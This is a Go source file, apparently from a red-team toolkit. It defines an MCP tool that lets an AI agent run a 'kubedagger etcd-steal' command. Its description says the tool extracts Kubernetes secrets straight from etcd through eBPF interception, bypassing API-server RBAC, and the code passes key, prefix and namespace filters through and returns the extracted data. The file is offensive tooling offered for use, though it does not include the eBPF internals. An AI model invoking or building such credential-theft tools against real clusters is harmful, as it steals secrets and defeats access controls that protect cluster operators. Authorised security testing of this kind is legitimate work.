package kubedagger

import (
	"context"
	"encoding/json"
	"fmt"
	"strings"

	"github.com/yasindce1998/redhands/pkg/executor"
	"github.com/yasindce1998/redhands/pkg/mcp"
)

type EtcdStealInput struct {
	Key       string `json:"key,omitempty"`
	Prefix    string `json:"prefix,omitempty"`
	Secrets   bool   `json:"secrets,omitempty"`
	Namespace string `json:"namespace,omitempty"`
	Format    string `json:"format,omitempty"`
}

type EtcdStealTool struct {
	exec executor.Executor
}

func NewEtcdSteal(exec executor.Executor) *EtcdStealTool {
	return &EtcdStealTool{exec: exec}
}

func (t *EtcdStealTool) Name() string { return "kubedagger_etcd_steal" }

func (t *EtcdStealTool) Description() string {
	return "Extract secrets directly from etcd by intercepting the etcd server's read/write operations via eBPF. Bypasses Kubernetes API server RBAC entirely since it operates at the storage layer."
}

func (t *EtcdStealTool) InputSchema() json.RawMessage {
	return json.RawMessage(`{
		"type": "object",
		"properties": {
			"key": {
				"type": "string",
				"description": "Specific etcd key to read"
			},
			"prefix": {
				"type": "string",
				"description": "Key prefix to enumerate (e.g., '/registry/secrets')"
			},
			"secrets": {
				"type": "boolean",
				"description": "Target Kubernetes secrets specifically"
			},
			"namespace": {
				"type": "string",
				"description": "Filter secrets by namespace"
			},
			"format": {
				"type": "string",
				"enum": ["text", "json", "raw"],
				"description": "Output format"
			}
		}
	}`)
}

func (t *EtcdStealTool) Execute(ctx context.Context, params json.RawMessage) (*mcp.ToolResult, error) {
	var input EtcdStealInput
	if err := json.Unmarshal(params, &input); err != nil {
		return errorResult("invalid input: " + err.Error()), nil
	}

	if err := validateSafeString(input.Key, "key"); err != nil {
		return errorResult(err.Error()), nil
	}
	if err := validateSafeString(input.Prefix, "prefix"); err != nil {
		return errorResult(err.Error()), nil
	}
	if err := validateNamespace(input.Namespace); err != nil {
		return errorResult(err.Error()), nil
	}

	args := []string{"etcd-steal"}
	if input.Key != "" {
		args = append(args, "--key", input.Key)
	}
	if input.Prefix != "" {
		args = append(args, "--prefix", input.Prefix)
	}
	if input.Secrets {
		args = append(args, "--secrets")
	}
	if input.Namespace != "" {
		args = append(args, "--namespace", input.Namespace)
	}
	if input.Format != "" {
		args = append(args, "--format", input.Format)
	}

	result, err := t.exec.Run(ctx, "kubedagger-client", args...)
	if err != nil {
		stderr := ""
		if result != nil {
			stderr = string(result.Stderr)
		}
		return errorResult(fmt.Sprintf("kubedagger etcd-steal failed: %s\n%s", err.Error(), stderr)), nil
	}

	output := strings.TrimSpace(string(result.Stdout))
	var sb strings.Builder
	sb.WriteString("## KubeDagger Etcd Steal\n\n")
	if output == "" {
		sb.WriteString("No data extracted.\n")
	} else {
		sb.WriteString("```\n")
		sb.WriteString(output)
		sb.WriteString("\n```\n")
	}

	return &mcp.ToolResult{
		Content: []mcp.ContentBlock{{Type: "text", Text: sb.String()}},
	}, nil
}
